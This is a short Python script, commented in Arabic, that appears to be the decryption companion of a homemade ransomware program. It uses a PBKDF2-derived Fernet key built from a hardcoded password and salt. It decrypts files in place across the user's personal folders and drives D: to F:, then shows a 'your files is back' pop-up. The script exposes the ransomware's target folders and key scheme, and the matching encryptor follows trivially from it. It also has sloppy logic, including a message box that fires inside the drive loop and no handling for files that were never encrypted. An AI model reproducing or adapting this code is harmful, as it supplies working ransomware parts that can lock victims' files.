import os
import base64
from tkinter import messagebox
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key(password, salt=b"salt_12345", iterations=100_000):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def decrypt_file(file_path, password):
    key = generate_key(password)
    cipher_suite = Fernet(key)

    ignored_extensions = (".ini", ".inf")

    if file_path.lower().endswith(ignored_extensions):
        return

    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()

        # محاولة فك تشفير البيانات
        decrypted_data = cipher_suite.decrypt(encrypted_data)

        # إذا نجحت، قم بكتابة البيانات المفكوكة إلى الملف
        with open(file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)

    except PermissionError:
        print(f"تم تجاوز الملف: {file_path} - حدوث خطأ في الوصول.")


def decrypt_folder_recursively(folder_path, password):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            decrypt_file(file_path, password)

if __name__ == "__main__":
    videos_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Videos')
    download = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
    pic = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')
    ob = os.path.join(os.path.join(os.environ['USERPROFILE']), '3D Objects')
    Music = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Music')
    Desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
    paths_to_decrypt = [videos_path, download, pic, ob, Music, documents, Desktop]
    additional_drives = ["D:", "E:", "F:"]

    # فك تشفير الملفات
    password_decrypt = "hgsjgdjdg"
    for path in paths_to_decrypt:
        decrypt_folder_recursively(path, password_decrypt)

    # بحث عن المجلدات المشفرة في الأقراص الإضافية وفك تشفيرها أيضاً
    for drive in additional_drives:
        for root, _, _ in os.walk(drive):
            decrypt_folder_recursively(root, password_decrypt)
            messagebox.showinfo("5252", "your files is back :(")